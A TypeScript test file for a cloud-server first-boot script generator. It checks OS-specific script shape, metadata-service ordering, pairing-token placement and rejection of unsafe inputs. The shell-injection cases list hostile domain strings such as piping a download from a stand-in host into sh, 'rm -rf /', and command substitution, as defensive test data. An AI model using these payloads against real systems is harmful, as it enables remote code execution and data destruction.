/**
 * buildUserData — the first-boot script generator.
 *
 * The script is shell-embedded operator input, so the two things under test are
 * (1) shape per flavor/domain mode and (2) that nothing unsafe can be
 * interpolated. Also asserts the pairing code appears in EXACTLY one command:
 * the printf that writes /etc/walnut/setup-token.
 */
import { describe, it, expect } from 'vitest'
import {
  buildUserData,
  manualUserDataSteps,
  sslipHostname,
  DEFAULT_REPO_URL,
  SSLIP_AUTO,
} from '../../../src/core/cloud-setup/user-data.js'

const CODE = 'a1b2c3d4e5f60718293a4b5c6d7e8f90'

describe('buildUserData shape', () => {
  it('al2023 + own domain: bash header, dnf-first git install, clone, token file, setup.sh', () => {
    const script = buildUserData({ domain: 'wn.example.com', pairingCode: CODE, flavor: 'al2023' })
    expect(script.startsWith('#!/usr/bin/env bash\nset -euo pipefail\n')).toBe(true)
    expect(script).toContain('exec > >(tee /var/log/walnut-setup.log) 2>&1')
    // dnf is tried before apt on al2023.
    expect(script.indexOf('dnf install -y git')).toBeLessThan(script.indexOf('apt-get install -y git'))
    expect(script).toContain(`git clone --branch 'main' '${DEFAULT_REPO_URL}' /opt/walnut`)
    expect(script).toContain("DOMAIN='wn.example.com'")
    expect(script).toContain('install -d -m 700 /etc/walnut')
    expect(script).toContain('chmod 600 /etc/walnut/setup-token')
    expect(script).toContain('bash /opt/walnut/scripts/cloud/setup.sh "$DOMAIN"')
    // No sslip resolver block in own-domain mode.
    expect(script).not.toContain('sslip.io')
  })

  it('ubuntu flavor tries apt first', () => {
    const script = buildUserData({ domain: 'wn.example.com', pairingCode: CODE, flavor: 'ubuntu' })
    expect(script.indexOf('apt-get install -y git')).toBeLessThan(script.indexOf('dnf install -y git'))
    expect(script).toContain('DEBIAN_FRONTEND=noninteractive')
  })

  it('SSLIP_AUTO emits an IMDSv2-then-ifconfig resolver that polls for a stable IP', () => {
    const script = buildUserData({ domain: SSLIP_AUTO, pairingCode: CODE, flavor: 'al2023' })
    expect(script).toContain('X-aws-ec2-metadata-token-ttl-seconds')
    expect(script).toContain('http://169.254.169.254/latest/meta-data/public-ipv4')
    expect(script).toContain('curl -4 -s -m 5 ifconfig.me')
    expect(script).toContain('DOMAIN="$(echo "$IP" | tr . -).sslip.io"')
    // Stability check (two agreeing reads) and a bounded loop, not `while true`.
    expect(script).toContain('[ "$cur" = "$prev" ]')
    expect(script).toContain('for _ in $(seq 1 36); do')
    // The sentinel itself must never survive into the script.
    expect(script).not.toContain(SSLIP_AUTO)
  })

  it('reads the metadata service IMDSv2-first: the token PUT precedes the IP GET', () => {
    // The AWS stack sets requireImdsv2, so an IMDSv1-style (tokenless) read
    // would 401 and strand the box with no hostname. Assert the ordering and
    // that the public-ipv4 GET always carries the token header.
    const script = buildUserData({ domain: SSLIP_AUTO, pairingCode: CODE, flavor: 'al2023' })
    const put = script.indexOf('-X PUT http://169.254.169.254/latest/api/token')
    const get = script.indexOf('http://169.254.169.254/latest/meta-data/public-ipv4')
    expect(put).toBeGreaterThan(-1)
    expect(put).toBeLessThan(get)
    // No tokenless curl to public-ipv4 anywhere.
    expect(script).not.toMatch(/curl(?![^\n]*metadata-token)[^\n]*public-ipv4/)
    // ifconfig.me is only the non-AWS fallback, taken when no token came back.
    expect(script).toMatch(/if \[ -n "\$token" \]; then/)
  })

  it('honours a custom repoUrl and branch', () => {
    const script = buildUserData({
      domain: 'wn.example.com',
      pairingCode: CODE,
      flavor: 'al2023',
      repoUrl: 'https://github.com/acme/fork.git',
      branch: 'release/1.x',
    })
    expect(script).toContain(`git clone --branch 'release/1.x' 'https://github.com/acme/fork.git' /opt/walnut`)
  })

  it('is stable for the same inputs (no timestamps / nonces in the body)', () => {
    const a = buildUserData({ domain: 'wn.example.com', pairingCode: CODE, flavor: 'al2023' })
    const b = buildUserData({ domain: 'wn.example.com', pairingCode: CODE, flavor: 'al2023' })
    expect(a).toBe(b)
  })
})

describe('pairing code placement', () => {
  it('appears in exactly one line — the printf that writes the token file', () => {
    for (const flavor of ['al2023', 'ubuntu'] as const) {
      for (const domain of ['wn.example.com', SSLIP_AUTO]) {
        const script = buildUserData({ domain, pairingCode: CODE, flavor })
        const hits = script.split('\n').filter((line) => line.includes(CODE))
        expect(hits, `${flavor}/${domain}`).toHaveLength(1)
        expect(hits[0]).toBe(`printf '%s' '${CODE}' > /etc/walnut/setup-token`)
      }
    }
  })

  it('never passes the code to setup.sh, exports it into the environment, or echoes it', () => {
    const script = buildUserData({ domain: 'wn.example.com', pairingCode: CODE, flavor: 'al2023' })
    expect(script).not.toContain(`setup.sh ${CODE}`)
    // No `export FOO=...` anywhere: the code must not reach any child's env.
    expect(script.split('\n').filter((l) => /^\s*export\s/.test(l))).toHaveLength(0)
    expect(script).not.toMatch(new RegExp(`echo\\s+"?${CODE}`))
  })
})

describe('input validation (shell injection)', () => {
  const cases: Array<[string, string]> = [
    ['single quote', "wn.example.com'; curl evil.test | sh; '"],
    ['semicolon', 'wn.example.com; rm -rf /'],
    ['command substitution', 'wn.$(whoami).example.com'],
    ['backtick', 'wn.`id`.example.com'],
    ['newline', 'wn.example.com\ncurl evil.test | sh'],
    ['scheme', 'https://wn.example.com'],
    ['path', 'wn.example.com/../../etc'],
    ['space', 'wn.example.com foo'],
    ['empty', ''],
  ]
  for (const [name, domain] of cases) {
    it(`rejects a domain with a ${name}`, () => {
      expect(() => buildUserData({ domain, pairingCode: CODE, flavor: 'al2023' })).toThrow(/Invalid domain/)
    })
  }

  it('rejects a malformed pairing code', () => {
    for (const bad of ['', 'short', CODE.toUpperCase(), `${CODE}extra`, "abc'; id; '"]) {
      expect(() => buildUserData({ domain: 'wn.example.com', pairingCode: bad, flavor: 'al2023' }))
        .toThrow(/Invalid pairing code/)
    }
  })

  it('rejects a non-https or metacharacter-bearing repoUrl', () => {
    for (const bad of ['http://insecure.test/r.git', 'git@host:r.git', 'https://h.test/r.git; id']) {
      expect(() => buildUserData({ domain: 'wn.example.com', pairingCode: CODE, flavor: 'al2023', repoUrl: bad }))
        .toThrow(/Invalid repoUrl/)
    }
  })

  it('rejects an unsafe branch', () => {
    expect(() => buildUserData({ domain: 'wn.example.com', pairingCode: CODE, flavor: 'al2023', branch: 'main; id' }))
      .toThrow(/Invalid branch/)
  })
})

describe('sslipHostname', () => {
  it('dashes an IPv4 address into the sslip.io wildcard-DNS form', () => {
    expect(sslipHostname('203.0.113.77')).toBe('203-0-113-77.sslip.io')
  })

  it('agrees with the hostname the generated boot script derives on the box', () => {
    // One definition, two consumers (the boot script's shell `tr . -`, and the
    // provider drivers). If these ever diverge, a deploy claims the wrong name.
    const script = buildUserData({ domain: SSLIP_AUTO, pairingCode: CODE, flavor: 'al2023' })
    expect(script).toContain('DOMAIN="$(echo "$IP" | tr . -).sslip.io"')
    expect(sslipHostname('10.0.0.1')).toBe('10-0-0-1.sslip.io')
  })
})

describe('manualUserDataSteps', () => {
  it('mentions the DNS record for own-domain and its absence for sslip', () => {
    expect(manualUserDataSteps('wn.example.com').join(' ')).toContain('A record for wn.example.com')
    expect(manualUserDataSteps(SSLIP_AUTO).join(' ')).toContain('no DNS record needed')
  })
})
